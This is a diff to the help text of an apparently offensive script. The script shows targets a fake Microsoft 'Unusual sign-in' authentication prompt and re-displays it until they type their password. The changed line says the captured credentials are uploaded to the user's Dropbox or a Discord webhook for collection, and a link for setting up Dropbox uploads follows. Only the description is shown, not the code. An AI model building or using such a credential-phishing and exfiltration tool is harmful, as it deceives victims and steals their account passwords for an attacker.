@@ -25,7 +25,7 @@
 	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
 	This will be followed by a fake authentication ui prompt. 
 	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
-	Once the target enters their credentials their information will be uploaded to your dropbox for collection
+	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection
 
 .Link
 	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
